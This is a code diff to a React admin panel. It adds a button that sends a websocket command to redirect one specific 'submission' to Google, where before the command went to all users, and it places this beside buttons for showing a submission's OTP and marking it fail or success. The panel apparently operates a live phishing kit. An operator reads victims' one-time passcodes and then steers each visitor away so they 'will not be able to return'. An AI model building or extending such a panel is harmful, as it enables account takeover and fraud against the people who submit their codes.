@@ -374,15 +374,16 @@ const AdminPanel = () => {
     }
   };
 
-  const redirectUsersToGoogle = () => {
-    if (window.confirm('Are you sure you want to redirect all users to Google? They will not be able to return to your website.')) {
-      // Send command to all connected clients to redirect to Google
+  const redirectUserToGoogle = (submissionId: string) => {
+    if (window.confirm('Are you sure you want to redirect this user to Google? They will not be able to return to your website.')) {
+      // Send command to specific user to redirect to Google
       wsClient.send('admin_command', {
         command: 'redirect_to_google',
+        submission_id: submissionId,
         created_at: new Date().toISOString(),
       });
       
-      showNotification('Redirect command sent to all users');
+      showNotification('Redirect command sent to user');
     }
   };
 
@@ -578,7 +579,7 @@ const AdminPanel = () => {
 
                 {/* Action Buttons - Only show for submissions that haven't been commanded with final commands */}
                 {shouldShowCommands(submission.id) && (
-                  <div className="grid grid-cols-2 gap-2 mb-4">
+                  <div className="grid grid-cols-3 gap-2 mb-4">
                     <button
                       onClick={(e) => { e.stopPropagation(); handleShowOtp(submission.id); }}
                       className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
@@ -590,6 +591,17 @@ const AdminPanel = () => {
                       className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-3 rounded text-sm w-full"
                     >
                       Fail
+                    </button>
+                    <button
+                      onClick={(e) => { e.stopPropagation(); redirectUserToGoogle(submission.id); }}
+                      className="bg-white hover:bg-gray-100 text-green-600 px-3 py-2 rounded text-sm flex items-center justify-center gap-1 border shadow-sm w-full"
+                    >
+                      <img 
+                        src="https://www.google.com/favicon.ico" 
+                        alt="Google" 
+                        className="w-4 h-4"
+                      />
+                      <span className="font-medium">Redirect</span>
                     </button>
                     <button
                       onClick={(e) => { e.stopPropagation(); sendCommand('success', submission.id); }}
